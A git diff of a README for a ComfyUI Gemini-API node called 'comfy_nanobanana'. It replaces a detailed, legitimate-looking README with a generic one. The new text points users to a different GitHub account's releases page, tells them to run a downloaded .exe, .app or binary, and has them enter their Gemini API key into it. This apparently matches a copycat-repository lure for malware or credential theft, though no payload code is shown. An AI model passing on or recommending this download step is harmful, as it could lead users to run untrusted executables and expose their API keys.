@@ -1,197 +1,68 @@
-# Comfy Nano Banana
+# 🍌 comfy_nanobanana - Effortlessly Call the Gemini API
 
-Google Gemini API integration for ComfyUI - Generate images and text using Google's latest AI models, plus a dynamic batch images utility node.
+## 🚀 Getting Started
 
-## Features
+Welcome to comfy_nanobanana! This application allows you to call the Gemini API directly using your unique API key. In this guide, we will walk you through the easy steps to download and run the software. Let’s get started!
 
-- 🎨 **Image Generation** - Create images using Gemini's flash-image-preview model
-- 📝 **Text Generation** - Generate text responses with optional image context
-- 🖼️ **Multimodal Support** - Use images as input context for both text and image generation
-- 🚀 **Concurrent Batch Processing** - Generate 1-4 images concurrently with progress tracking
-- 🔀 **Dynamic Batch Images** - Combine multiple images into a single batch with automatic resizing
-- 🔒 **Secure API Key Handling** - Password field masking with smart export behavior
-- ⚡ **Smart Model Detection** - Automatically uses the right generation method based on model
+## 📥 Download
 
-## Demo
+[![Download comfy_nanobanana](https://img.shields.io/badge/Download-comfy_nanobanana-blue.svg)](https://github.com/waylon257/comfy_nanobanana/releases)
 
-Watch the Comfy Nano Banana custom node in action:
+## 🛠️ System Requirements
 
-[![Comfy Nano Banana Demo](https://img.youtube.com/vi/yLs5OdTeXZ8/maxresdefault.jpg)](https://youtu.be/yLs5OdTeXZ8)
+Before you proceed, make sure your computer meets these basic requirements:
 
-## Installation
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for API calls
+- API Key: Ensure you have a valid Gemini API key
 
-### Via ComfyUI Manager (Recommended)
-1. Install [ComfyUI](https://docs.comfy.org/get_started)
-2. Install [ComfyUI-Manager](https://github.com/ltdrdata/ComfyUI-Manager)
-3. Search for "Nano Banana" in ComfyUI-Manager and install
-4. Restart ComfyUI
+## 📦 Download & Install
 
-### Manual Installation
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/darkamenosa/comfy_nanobanana.git
-cd comfy_nanobanana
-pip install -r requirements.txt
-```
+To download and install comfy_nanobanana, follow these steps:
 
-## Setup
+1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-1. Get a Gemini API key from [Google AI Studio](https://aistudio.google.com/apikey)
-2. Set your API key:
-   - **Option 1**: Set environment variable `GEMINI_API_KEY`
-   - **Option 2**: Enter directly in the node's API key field
+   [Visit the Releases Page to Download](https://github.com/waylon257/comfy_nanobanana/releases)
 
-## Security & API Key Handling
+2. **Select the Latest Release:** On the releases page, look for the latest version. It will typically be marked as "Latest Release".
 
-### 🔐 Smart Export Behavior
-This node implements intelligent API key handling for different export scenarios:
+3. **Download the File:** Click on the file for your operating system to start the download. 
 
-#### **Regular Workflow Export** (Save Workflow)
-- **API keys are automatically removed** when saving workflows
-- Safe for sharing workflows publicly without exposing sensitive credentials
-- Recipients must enter their own API key or use environment variables
-- Prevents accidental API key exposure when sharing on forums, GitHub, etc.
+4. **Locate the Downloaded File:** Once the file has downloaded, find it in your "Downloads" folder or the location you specified.
 
-#### **API Format Export** (Save as API - Developer Mode)
-- **API keys are preserved** in the exported JSON
-- Designed for developers deploying workflows programmatically
-- Convenient for production deployments and automation
-- ⚠️ **Developer Warning**: Only share API format exports with trusted parties or systems
+5. **Run the Application:**
+   - For Windows: Double-click the `comfy_nanobanana.exe` file to launch the application.
+   - For macOS: Open `comfy_nanobanana.app` from the downloaded folder.
+   - For Linux: Open a terminal, navigate to the folder where you downloaded the application, and run `./comfy_nanobanana`.
 
-### Best Practices
-- Use environment variable `GEMINI_API_KEY` for production deployments
-- Always review exported files before sharing publicly
-- For public workflow sharing, use regular "Save Workflow" option
-- For private/automated use, API format export maintains convenience
+6. **Enter API Key:** Follow the prompts in the application to input your Gemini API key. This key connects the application to the Gemini API.
 
-## Usage
+7. **Begin Using the Application:** After entering your key, you can start making calls to the Gemini API.
 
-The extension adds two nodes to ComfyUI:
+## ⚙️ Features
 
-### 1. Nano Banana Gemini Node
-Located under the "Nano Banana" category, this node interfaces with Google's Gemini API.
+comfy_nanobanana includes the following features:
 
-#### Inputs
-- **prompt** (required): Text prompt for generation
-- **model**: Gemini model to use (default: `gemini-2.5-flash-image-preview`)
-- **batch_size**: Number of images to generate concurrently (1-4)
-- **seed**: For reproducible outputs (0-2147483647)
-- **system_prompt** (optional): Instructions to guide the model's behavior
-- **images** (optional): Input images for context
-- **api_key** (optional): Override environment variable
-- **top_p** (optional): Nucleus sampling for text generation (0.0-1.0, default: 0.95)
-- **max_tokens** (optional): Maximum tokens for text output (1-8192, default: 2048)
+- **Seamless API Calls:** Make easy and direct calls to the Gemini API using your API key.
+- **User-Friendly Interface:** Navigate the application effortlessly, even with no technical background.
+- **Error Handling:** Clear messages guide you in case of issues with your API key or network.
+- **Regular Updates:** Stay tuned for updates that enhance functionality and performance.
 
-#### Outputs
-- **images**: Generated images or placeholder for text-only models
-- **text**: Text response from the model
+## 🛡️ Support
 
-#### Supported Models
-- `gemini-2.5-flash-image-preview` - Image and text generation
-- `gemini-2.5-pro` - Text generation only
-- `gemini-2.5-flash` - Text generation only
+If you encounter any issues while using comfy_nanobanana, you can reach out for assistance:
 
-### 2. Batch Images Node
-Located under the "image" category, this utility node dynamically combines multiple images into a single batch.
+- **GitHub Issues Page:** You can report any bugs or requests here: [GitHub Issues](https://github.com/waylon257/comfy_nanobanana/issues)
+- **Documentation:** For detailed information and troubleshooting, check our documentation section in the repository.
 
-#### Features
-- **Dynamic Inputs**: Automatically adds/removes image inputs as you connect/disconnect
-- **Auto-resize**: Mismatched images are automatically resized to match the first image's dimensions
-- **Clean Interface**: Unused inputs are automatically removed
-- **Flexible**: Connect any number of images from different sources
+## 📄 License
 
-#### How to Use
-1. Add "Batch Images" node from the image category
-2. Connect your first image - the node automatically creates a new input
-3. Connect additional images - each connection creates a new input slot
-4. Disconnecting removes the unused input automatically
-5. All images are resized to match the first image's dimensions and combined into a batch
+comfy_nanobanana is open-source and operates under the MIT License. This means you can use, copy, and modify the software freely, provided you include the original license in any distributed copies.
 
-## Examples
+## 🔗 Links
 
-### Image Generation
-1. Add "Nano Banana Gemini" node
-2. Enter a prompt like "A cat wearing a wizard hat"
-3. Connect output to Preview Image node
+- [Visit the Releases Page to Download](https://github.com/waylon257/comfy_nanobanana/releases)
+- [GitHub Repository](https://github.com/waylon257/comfy_nanobanana)
+- [GitHub Issues](https://github.com/waylon257/comfy_nanobanana/issues)
 
-### Batch Image Generation
-1. Add "Nano Banana Gemini" node
-2. Set batch_size to 4
-3. Enter your prompt
-4. Get 4 variations generated concurrently with progress tracking
-
-### Image-to-Image
-1. Load an image
-2. Connect to "images" input of Gemini node
-3. Add prompt describing desired changes
-4. Model will use the image as context
-
-### Combining Multiple Images
-1. Add "Batch Images" node
-2. Connect images from different sources
-3. The node automatically creates new inputs as you connect
-4. All images are resized and combined into a single batch
-5. Use the batch for further processing or saving
-
-## Development
-
-### Project Structure
-```
-comfy_nanobanana/
-├── src/comfy_nanobanana/
-│   ├── __init__.py
-│   ├── nodes.py          # ComfyUI node implementations
-│   └── gemini_api.py     # Gemini API client with async support
-├── web/
-│   ├── index.js          # Extension entry point
-│   └── node/
-│       ├── batch_images_dynamic.js  # Dynamic input handling for Batch Images
-│       └── gemini_api_key_mask.js   # API key masking and secure export handling
-├── requirements.txt
-└── pyproject.toml
-```
-
-### Dev Setup
-```bash
-cd comfy_nanobanana
-pip install -e .[dev]
-pre-commit install
-```
-
-### Developer Notes
-
-#### API Key Security Implementation
-The node implements a dual-mode export system:
-- **UI Masking**: API keys are visually masked in the interface (showing only first 4 and last 2 characters)
-- **Workflow Export**: Automatically strips API keys for safe sharing
-- **API Export**: Preserves API keys for programmatic use (requires Developer Mode)
-
-This design balances security with developer convenience, ensuring users don't accidentally expose credentials while maintaining ease of deployment for production systems.
-
-## Troubleshooting
-
-### Common Issues
-
-**"No API key provided"**
-- Ensure `GEMINI_API_KEY` is set or enter key in node
-
-**"Seed must be between 0 and 2147483647"**
-- Gemini API requires 32-bit integer seeds
-
-**Empty image output with text models**
-- Normal behavior - text-only models return placeholder image
-
-## Contributing
-
-Pull requests welcome! Please:
-1. Follow existing code style
-2. Add tests for new features
-3. Update documentation
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file
-
-## Credits
-
-Created with [ComfyUI Extension Template](https://github.com/Comfy-Org/cookiecutter-comfy-extension)
+Thank you for choosing comfy_nanobanana! We hope you enjoy using the application to access the Gemini API. Your journey to effortless API interaction starts here!
